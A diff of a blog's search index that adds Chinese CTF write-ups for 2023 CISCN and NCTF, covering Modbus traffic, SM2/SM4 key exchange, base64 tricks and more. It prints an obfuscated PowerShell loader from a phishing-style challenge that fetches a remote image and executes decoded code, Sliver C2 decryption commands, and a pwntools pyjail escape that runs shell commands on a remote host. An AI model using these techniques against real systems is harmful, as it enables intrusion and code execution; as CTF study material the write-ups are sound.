@@ -260,6 +260,157 @@
       </tags>
   </entry>
   <entry>
+    <title>2023Ciscn-Writeup</title>
+    <url>/2023/09/28/2023Ciscn-Writeup/</url>
+    <content><![CDATA[<h1>2023Ciscn-Writeup</h1>
+<h2 id="Misc">Misc</h2>
+<h3 id="签到卡">签到卡</h3>
+<p><strong>考点：签到</strong></p>
+<p>前往公众号查看提示</p>
+<img src="https://s2.loli.net/2023/09/29/oJZMzENhLVPRB3H.jpg" style="zoom: 50%;" />
+<p>print(open(‘/flag’).read())</p>
+<img src="https://s2.loli.net/2023/09/29/vP81gtA4meOCbzx.jpg" style="zoom: 65%;" />
+<h3 id="被加密的生产流量">被加密的生产流量</h3>
+<p><strong>考点：Modbus协议</strong></p>
+<p>下载附件得到一个modbus.pcap，用wireshark打开后，查看Modbus/TCP协议，按正常顺序排序。</p>
+<p><img src="https://s2.loli.net/2023/09/29/xVKGsjTdmtwIy43.jpg" alt=""></p>
+<p>在正常的数据流之后，在末尾段发现异常字母，逐一提取拼接，得到一个字符串</p>
+<p><img src="https://s2.loli.net/2023/09/29/n3l2yedwSfrbTUM.jpg" alt=""></p>
+<p>将字符串进行base32编码，得到flag</p>
+<p><img src="https://s2.loli.net/2023/09/29/KeXyMoC7NsWmgpl.jpg" alt=""></p>
+<h3 id="国粹">国粹</h3>
+<p><strong>考点：图片识别</strong></p>
+<p>下载附件给出了三个图</p>
+<p>观察题目那图发现多出一个一万，拼接考虑成x轴和y轴，猜测与坐标有关</p>
+<p>一万到九万是1-9，一筒到九筒是10-18，一条到九条是19-27，东南西北中发白是28-34，春夏秋冬梅兰竹菊是35-42</p>
+<p>所以将a中的作为横坐标，k作为纵坐标进行绘图</p>
+<p>得到最终的flag为flag{202305012359}</p>
+<h2 id="crypto">crypto</h2>
+<h3 id="国密">国密</h3>
+<p><strong>考点：可信计算</strong></p>
+<p>下载附件，查看提示，根据其密钥分发流程进行操作</p>
+<p><img src="https://s2.loli.net/2023/09/29/HTBcAo3kXvmD2Z5.jpg" alt=""></p>
+<p>首先发送</p>
+<p><code>curl -d &quot;name=%E7%8E%8B%E5%98%89%E5%AE%87&amp;school=%E5%93%88%E5%B0%94%E6%BB%A8%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6&amp;phone=17625419356&quot; http://39.106.48.123:24920/api/login</code></p>
+<p>得到用户id</p>
+<p><code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code></p>
+<p>生成SM2算法的公钥和密钥</p>
+<p><code>A_Public_Key:C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B</code><br>
+<code>A_Private_Key:CB42D512CD6C0E170CDE1F7611946C797ED546BD017BF784CF954E1D4F4D2CAB</code></p>
+<p>发送公钥</p>
+<p>curl -d “id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;publicKey=C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B” <a href="http://39.106.48.123:24920/api/allkey">http://39.106.48.123:24920/api/allkey</a></p>
+<p>得到结果</p>
+<p><code>&#123;</code><br>
+<code>&quot;message&quot;: &quot;success&quot;,</code><br>
+<code>&quot;data&quot;: &#123;</code><br>
+<code>&quot;publicKey&quot;: &quot;0463e8cc27aa0be1438ad237b6f9bcf2180baf4ed91cb1706ad6beed7d4c91cedc387b93f47ddae75e949b3a0fcc17332614dbbc72ff3f4426bf4f0744b6af6d3b&quot;,</code><br>
+<code>&quot;privateKey&quot;: &quot;0b31854a2fdb1c7da50dc8850223b35099d92bd001fa8d9aa70e0a91292a7e00&quot;,</code><br>
+<code>&quot;randomString&quot;: &quot;036942bd54cf3183089cd6c2ea2962d8cccf37b3ac8c92a9a4663281f28ee49edd3162a0dabefba2c697c48cdd76a79ae8b6556a3957e3ad0ac89dea2f2937e2e9b446a0a907a03365ca8237e53395e914893ea55d12804396dd75f0e2cba03083d2cb7e0d50dabc9a37497c8faaa2d1&quot;,</code><br>
+<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code><br>
+<code>&#125;</code><br>
+<code>&#125;</code></p>
+<p>将随机数C密文采用SM2算法解密，得到结果</p>
+<p><code>56 BE 6C 83 45 46 BE 80 76 44 C4 B5 AD C7 29 CD</code></p>
+<p>使用16字节随机数C明文，对私钥B_Private_Key密文，采用SM4ECB算法解密</p>
+<p><code>99 BE 58 13 90 48 3E 81  3C DE 0B B2 BD 27 6C 2A   98 26 16 B0 15 5D E0 6E  21 BF 41 47 73 A4 AB AE</code></p>
+<p>向服务器请求密钥，得到回应</p>
+<p><code>&#123;</code><br>
+<code>&quot;message&quot;: &quot;success&quot;,</code><br>
+<code>&quot;data&quot;: &#123;</code><br>
+<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;,</code><br>
+<code>&quot;quantumString&quot;: &quot;a0c80a6b59232277fac84d8c2a7353435bc67bfe379ea1412146779d383a4f759d754bb8f06b6e3ae84d125b221feeb3f8c74737de7bdb821bb4725f7ae62efe5af67bbd60634e73936b34b657735e46c0c92ed91330b5d817870e48585050116cdef1f37c6d03bd2cb45d7df21e009c&quot;</code><br>
+<code>&#125;</code><br>
+<code>&#125;</code></p>
+<p>使用私钥B_Private_Key明文，对密钥D密文进行解密</p>
+<p><code>09 87 9B 5F 8D 9A 7F 83 32 7D 54 E3 59 84 38 C7</code></p>
+<p>发送验证，得到flag</p>
+<p><code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;quantumString=09879B5F8D9A7F83327D54E3598438C7&quot; http://39.106.48.123:24920/api/check</code><br>
+<code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot; http://39.106.48.123:24920/api/search</code></p>
+<h3 id="Sign-in-passwd">Sign_in_passwd</h3>
+<p><strong>考点：换表base64</strong></p>
+<p>观察字符串，发现是符合base64的码表，但结尾不为=，大概是换表了</p>
+<p><img src="https://s2.loli.net/2023/09/29/MspnjIl3tJThkS2.jpg" alt=""></p>
+<p>将下面的那串字符串进行url解码，以此为码表，对上面的字符串进行解码</p>
+<p><img src="https://s2.loli.net/2023/09/29/65xfZkeKvhV93YL.jpg" alt=""></p>
+<p>最终解码出来的结果不知道为什么少了一个}，手动补上</p>
+<p><img src="https://s2.loli.net/2023/09/29/At3rckvpngz1aul.jpg" alt=""></p>
+]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>ciscn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023NCTF-Writeup-Misc</title>
+    <url>/2024/02/03/2023NCTF-Writeup/</url>
+    <content><![CDATA[<h1>2023NCTF-Writeup-Misc</h1>
+<h2 id="前言">前言</h2>
+<p>NSSCTF已上线所有题目，本次实际比赛的题目只做出来两题，剩余全为赛后复现</p>
+<p>这里是Misc方向的复现，拖了好久，emmmmm</p>
+<p>狠狠地谴责自己（</p>
+<h2 id="Misc">Misc</h2>
+<h3 id="Jump-For-Signin">Jump For Signin</h3>
+<p><strong>考点：二维码</strong></p>
+<p>进游戏跳跃一下，然后得到二维码，扫就行了</p>
+<p><img src="https://s2.loli.net/2024/02/03/QGARhyquVPaX6kF.png" alt=""></p>
+<h3 id="Jump-For-Flag">Jump For Flag</h3>
+<p><strong>考点：二维码，dll逆向</strong></p>
+<p>对Assembly-CSharp.dll进行反编译</p>
+<p><img src="https://s2.loli.net/2024/02/03/L5f68uxZvk4SQd7.png" alt=""></p>
+<p>找到二维码生成块的关键代码</p>
+<p>然后exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_parameters</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line">    parameters = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        params = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, re.findall(<span class="string">r&#x27;\d+&#x27;</span>, line)))</span><br><span class="line">        parameters.append(params)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">concatenate_images</span>(<span class="params">parameters</span>):</span><br><span class="line">    img_size = (<span class="number">310</span>, <span class="number">310</span>)</span><br><span class="line">    result_img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, img_size, color=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> params <span class="keyword">in</span> parameters:</span><br><span class="line">        row, col, image_type = params[<span class="number">1</span>], params[<span class="number">3</span>], params[<span class="number">4</span>]</span><br><span class="line">        img_path = <span class="string">f&#x27;<span class="subst">&#123;image_type&#125;</span>.png&#x27;</span></span><br><span class="line">        img = Image.<span class="built_in">open</span>(img_path)</span><br><span class="line">        x_offset = col * <span class="number">10</span></span><br><span class="line">        y_offset = row * <span class="number">10</span></span><br><span class="line">        img = img.resize((<span class="number">10</span>, <span class="number">10</span>))</span><br><span class="line">        result_img.paste(img, (x_offset, y_offset))</span><br><span class="line">    result_img.save(<span class="string">&#x27;output.png&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parameters = read_parameters(<span class="string">&#x27;input1.txt&#x27;</span>)</span><br><span class="line">    concatenate_images(parameters)</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/02/03/gfa897hZeRG2bO6.png" alt=""></p>
+<h3 id="NCTF2077-jackpot">NCTF2077: jackpot</h3>
+<p><strong>考点：powershell混淆</strong></p>
+<p>首先是一个叫做喜报的邮件文件，打开可以发现一个图片和target.exe</p>
+<p>010打开可以target.exe发现存在一段powershell代码</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;-873e-12a9595bbce8&#125;&quot;</span>;</span><br><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>; <span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing; <span class="variable">$g</span> = a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;https://zysgmzb.club/hello/nctf.png&quot;</span>)); <span class="variable">$o</span> = a Byte[] <span class="number">31720</span>; (<span class="number">0</span>..<span class="number">12</span>) | % &#123; <span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2439</span>)) &#123; <span class="variable">$p</span> = <span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>, <span class="variable">$_</span>); <span class="variable">$o</span>[<span class="variable">$_</span> * <span class="number">2440</span> + <span class="variable">$x</span>] = ([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>) * <span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>)) &#125; &#125;; <span class="built_in">echo</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..31558</span>]))</span><br></pre></td></tr></table></figure>
+<p>实际比赛的时候对powershell不熟悉</p>
+<p>所以是使用的python对代码进行了重置，得到的结果，而没有直接该运行为输出</p>
+<p>这是赛时使用的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开本地 PNG 图像文件</span></span><br><span class="line">image_path = <span class="string">&quot;nctf.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理像素信息</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2440</span>):</span><br><span class="line">        pixel = img.getpixel((x, y))</span><br><span class="line">        value = (pixel[<span class="number">2</span>] &amp; <span class="number">15</span>) * <span class="number">16</span> | (pixel[<span class="number">1</span>] &amp; <span class="number">15</span>)</span><br><span class="line">        result += <span class="built_in">chr</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果字符串</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+<p>后来也知道一些基本的powershell，只需要将IEX改为echo即可</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>; <span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing; <span class="variable">$g</span> = a System.Drawing.Bitmap((aNet.WebClient).OpenRead(<span class="string">&quot;https://zysgmzb.club/hello/nctf.png&quot;</span>)); <span class="variable">$o</span> = a Byte[]</span><br><span class="line"><span class="number">31720</span>; (<span class="number">0</span>..<span class="number">12</span>) | % &#123; <span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2439</span>)) &#123; <span class="variable">$p</span> = <span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>, <span class="variable">$_</span>);</span><br><span class="line"><span class="variable">$o</span>[<span class="variable">$_</span> * <span class="number">2440</span> + <span class="variable">$x</span>] = ([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>) * <span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>)) &#125;</span><br><span class="line">&#125;; <span class="built_in">echo</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..31558</span>]))</span><br></pre></td></tr></table></figure>
+<p>运行成功后得到以下这段</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ( <span class="built_in">NEw-ObjeCt</span>  sySTeM.iO.sTReamreadEr( ( <span class="built_in">NEw-ObjeCt</span>  Io.cOMPrEssIoN.DEflATeSTREaM([<span class="type">sYsTEM.iO.MemoRYsTReaM</span>][<span class="type">cOnVert</span>]::frOMbAsE64StRinG( <span class="string">&#x27;自行填充&#x27;</span> ) ,[<span class="type">Io.cOMpReSsiON.cOMPreSsIonMoDe</span>]::dEcOmprESs )) , [<span class="type">tEXT.EncoDING</span>]::aScII) ).reADTOeNd() </span><br></pre></td></tr></table></figure>
+<p>看起来明显不对劲，字符很奇怪，很明显进行了混淆，实际比赛也是卡在了这里</p>
+<p>查询了一下<code>&amp;((GV '*mdR*').NaMe[3,11,2]-JoIN'') </code></p>
+<p>这是一种powershell反混淆技术，<a href="https://www.securonix.com/blog/hiding-the-powershell-execution-flow/">Securonix 威胁研究知识共享系列：隐藏 PowerShell 执行流 - Securonix</a></p>
+<p>实际上约等于IEX</p>
+<p>因此还是需要修改成echo输出</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ( <span class="built_in">NEw-ObjeCt</span>  sySTeM.iO.sTReamreadEr( ( <span class="built_in">NEw-ObjeCt</span>  Io.cOMPrEssIoN.DEflATeSTREaM([<span class="type">sYsTEM.iO.MemoRYsTReaM</span>][<span class="type">cOnVert</span>]::frOMbAsE64StRinG( <span class="string">&#x27;自行填充&#x27;</span> ) ,[<span class="type">Io.cOM</span></span><br><span class="line"><span class="type">pReSsiON.cOMPreSsIonMoDe</span>]::dEcOmprESs )) , [<span class="type">tEXT.EncoDING</span>]::aScII) ).reADTOeNd() </span><br></pre></td></tr></table></figure>
+<p>以此类推</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ( <span class="string">&#x27;自行填充&#x27;</span>.sPLIt( <span class="string">&#x27;&lt;r_l:&#123;&amp;Z&#x27;</span> ) | %&#123; ([<span class="type">cOnVErt</span>]::toInt16( ([<span class="built_in">strING</span>]<span class="variable">$_</span> ) , <span class="number">16</span> )<span class="operator">-aS</span>[<span class="built_in">cHAr</span>])&#125; ) <span class="operator">-JOIN</span> <span class="string">&#x27;&#x27;</span> </span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> (([<span class="type">rUNtiME.INTERoPsERvIceS.MaRshal</span>]::PTRtOstrinGBsTr([<span class="type">runtIme.INTeRopSeRviCES.mARShAl</span>]::seCUResTrInGTObsTR(<span class="variable">$</span>(<span class="string">&#x27;自行填充&#x27;</span> | <span class="built_in">conVeRtto-SEcurEsTrIng</span> <span class="literal">-key</span> (<span class="number">143</span>..<span class="number">112</span>))) ) ) ) <span class="operator">-JOIN</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>最终得到原始脚本，获得flag</p>
+<h3 id="NCTF2077-slivery">NCTF2077: slivery</h3>
+<p><strong>考点：</strong></p>
+<p>首先在镜像文件中我们可以直接提取出一个flag.zip</p>
+<p>sliver-c2流量解密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sliver_pcap_parser.py --pcap dump.pcapng --filter http --domain_name 192.168.207.128</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sliver_decrypt.py --transport http --file_path ./http-sessions.json --force minidump.dmp</span><br></pre></td></tr></table></figure>
+<p>P@33w000000rd_U_GOT解压压缩包</p>
+<h3 id="ezjail">ezjail</h3>
+<p><strong>考点：pyjail，UTF-7字符集利用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from base64 import b64encode</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"># s = process([&quot;python3&quot;,&quot;server.py&quot;])</span><br><span class="line">s = remote(&quot;node4.anna.nssctf.cn&quot;,28506)</span><br><span class="line">s.sendline(&quot;e&quot;)</span><br><span class="line">s.recvuntil(&quot; &gt; &quot;)</span><br><span class="line">#ls_exp = &quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span><br><span class="line">cat_flag_exp = &quot;__import__(&#x27;os&#x27;).system(&#x27;cat f*&#x27;)&quot;</span><br><span class="line">#s.sendline(b&#x27;#coding=utf7\r+&#x27; + b64encode(ls_exp.encode(&#x27;utf-16-</span><br><span class="line">be&#x27;)).replace(b&#x27;=&#x27;, b&#x27;&#x27;))</span><br><span class="line">s.sendline(b&#x27;#coding=utf7\r+&#x27; + b64encode(cat_flag_exp.encode(&#x27;utf-16-</span><br><span class="line">be&#x27;)).replace(b&#x27;=&#x27;, b&#x27;&#x27;))</span><br><span class="line">s.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>暂无环境，所以本题关注原理</p>
+<p>本题最开始显示的是⽩名单限制了特殊字符只有 +=#\r\n</p>
+<p>当时实际做的时候挺接近了，也想到了这一点，但是没有考虑到换行的问题</p>
+<h3 id="randommaker">randommaker</h3>
+<p><strong>考点：测信道</strong></p>
+<p>暂保留，不懂测信道</p>
+]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>NCTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2023NepNep-Writeup</title>
     <url>/2023/09/29/2023NepNep-Writeup/</url>
     <content><![CDATA[<h1>2023NepNep-Writeup</h1>
@@ -366,157 +517,6 @@
       </categories>
       <tags>
         <tag>NepNep</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2023NCTF-Writeup-Misc</title>
-    <url>/2024/02/03/2023NCTF-Writeup/</url>
-    <content><![CDATA[<h1>2023NCTF-Writeup-Misc</h1>
-<h2 id="前言">前言</h2>
-<p>NSSCTF已上线所有题目，本次实际比赛的题目只做出来两题，剩余全为赛后复现</p>
-<p>这里是Misc方向的复现，拖了好久，emmmmm</p>
-<p>狠狠地谴责自己（</p>
-<h2 id="Misc">Misc</h2>
-<h3 id="Jump-For-Signin">Jump For Signin</h3>
-<p><strong>考点：二维码</strong></p>
-<p>进游戏跳跃一下，然后得到二维码，扫就行了</p>
-<p><img src="https://s2.loli.net/2024/02/03/QGARhyquVPaX6kF.png" alt=""></p>
-<h3 id="Jump-For-Flag">Jump For Flag</h3>
-<p><strong>考点：二维码，dll逆向</strong></p>
-<p>对Assembly-CSharp.dll进行反编译</p>
-<p><img src="https://s2.loli.net/2024/02/03/L5f68uxZvk4SQd7.png" alt=""></p>
-<p>找到二维码生成块的关键代码</p>
-<p>然后exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_parameters</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line">    parameters = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        params = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, re.findall(<span class="string">r&#x27;\d+&#x27;</span>, line)))</span><br><span class="line">        parameters.append(params)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">concatenate_images</span>(<span class="params">parameters</span>):</span><br><span class="line">    img_size = (<span class="number">310</span>, <span class="number">310</span>)</span><br><span class="line">    result_img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, img_size, color=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> params <span class="keyword">in</span> parameters:</span><br><span class="line">        row, col, image_type = params[<span class="number">1</span>], params[<span class="number">3</span>], params[<span class="number">4</span>]</span><br><span class="line">        img_path = <span class="string">f&#x27;<span class="subst">&#123;image_type&#125;</span>.png&#x27;</span></span><br><span class="line">        img = Image.<span class="built_in">open</span>(img_path)</span><br><span class="line">        x_offset = col * <span class="number">10</span></span><br><span class="line">        y_offset = row * <span class="number">10</span></span><br><span class="line">        img = img.resize((<span class="number">10</span>, <span class="number">10</span>))</span><br><span class="line">        result_img.paste(img, (x_offset, y_offset))</span><br><span class="line">    result_img.save(<span class="string">&#x27;output.png&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parameters = read_parameters(<span class="string">&#x27;input1.txt&#x27;</span>)</span><br><span class="line">    concatenate_images(parameters)</span><br></pre></td></tr></table></figure>
-<p><img src="https://s2.loli.net/2024/02/03/gfa897hZeRG2bO6.png" alt=""></p>
-<h3 id="NCTF2077-jackpot">NCTF2077: jackpot</h3>
-<p><strong>考点：powershell混淆</strong></p>
-<p>首先是一个叫做喜报的邮件文件，打开可以发现一个图片和target.exe</p>
-<p>010打开可以target.exe发现存在一段powershell代码</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;-873e-12a9595bbce8&#125;&quot;</span>;</span><br><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>; <span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing; <span class="variable">$g</span> = a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;https://zysgmzb.club/hello/nctf.png&quot;</span>)); <span class="variable">$o</span> = a Byte[] <span class="number">31720</span>; (<span class="number">0</span>..<span class="number">12</span>) | % &#123; <span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2439</span>)) &#123; <span class="variable">$p</span> = <span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>, <span class="variable">$_</span>); <span class="variable">$o</span>[<span class="variable">$_</span> * <span class="number">2440</span> + <span class="variable">$x</span>] = ([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>) * <span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>)) &#125; &#125;; <span class="built_in">echo</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..31558</span>]))</span><br></pre></td></tr></table></figure>
-<p>实际比赛的时候对powershell不熟悉</p>
-<p>所以是使用的python对代码进行了重置，得到的结果，而没有直接该运行为输出</p>
-<p>这是赛时使用的</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开本地 PNG 图像文件</span></span><br><span class="line">image_path = <span class="string">&quot;nctf.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理像素信息</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2440</span>):</span><br><span class="line">        pixel = img.getpixel((x, y))</span><br><span class="line">        value = (pixel[<span class="number">2</span>] &amp; <span class="number">15</span>) * <span class="number">16</span> | (pixel[<span class="number">1</span>] &amp; <span class="number">15</span>)</span><br><span class="line">        result += <span class="built_in">chr</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果字符串</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-<p>后来也知道一些基本的powershell，只需要将IEX改为echo即可</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>; <span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing; <span class="variable">$g</span> = a System.Drawing.Bitmap((aNet.WebClient).OpenRead(<span class="string">&quot;https://zysgmzb.club/hello/nctf.png&quot;</span>)); <span class="variable">$o</span> = a Byte[]</span><br><span class="line"><span class="number">31720</span>; (<span class="number">0</span>..<span class="number">12</span>) | % &#123; <span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2439</span>)) &#123; <span class="variable">$p</span> = <span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>, <span class="variable">$_</span>);</span><br><span class="line"><span class="variable">$o</span>[<span class="variable">$_</span> * <span class="number">2440</span> + <span class="variable">$x</span>] = ([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>) * <span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>)) &#125;</span><br><span class="line">&#125;; <span class="built_in">echo</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..31558</span>]))</span><br></pre></td></tr></table></figure>
-<p>运行成功后得到以下这段</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ( <span class="built_in">NEw-ObjeCt</span>  sySTeM.iO.sTReamreadEr( ( <span class="built_in">NEw-ObjeCt</span>  Io.cOMPrEssIoN.DEflATeSTREaM([<span class="type">sYsTEM.iO.MemoRYsTReaM</span>][<span class="type">cOnVert</span>]::frOMbAsE64StRinG( <span class="string">&#x27;自行填充&#x27;</span> ) ,[<span class="type">Io.cOMpReSsiON.cOMPreSsIonMoDe</span>]::dEcOmprESs )) , [<span class="type">tEXT.EncoDING</span>]::aScII) ).reADTOeNd() </span><br></pre></td></tr></table></figure>
-<p>看起来明显不对劲，字符很奇怪，很明显进行了混淆，实际比赛也是卡在了这里</p>
-<p>查询了一下<code>&amp;((GV '*mdR*').NaMe[3,11,2]-JoIN'') </code></p>
-<p>这是一种powershell反混淆技术，<a href="https://www.securonix.com/blog/hiding-the-powershell-execution-flow/">Securonix 威胁研究知识共享系列：隐藏 PowerShell 执行流 - Securonix</a></p>
-<p>实际上约等于IEX</p>
-<p>因此还是需要修改成echo输出</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ( <span class="built_in">NEw-ObjeCt</span>  sySTeM.iO.sTReamreadEr( ( <span class="built_in">NEw-ObjeCt</span>  Io.cOMPrEssIoN.DEflATeSTREaM([<span class="type">sYsTEM.iO.MemoRYsTReaM</span>][<span class="type">cOnVert</span>]::frOMbAsE64StRinG( <span class="string">&#x27;自行填充&#x27;</span> ) ,[<span class="type">Io.cOM</span></span><br><span class="line"><span class="type">pReSsiON.cOMPreSsIonMoDe</span>]::dEcOmprESs )) , [<span class="type">tEXT.EncoDING</span>]::aScII) ).reADTOeNd() </span><br></pre></td></tr></table></figure>
-<p>以此类推</p>
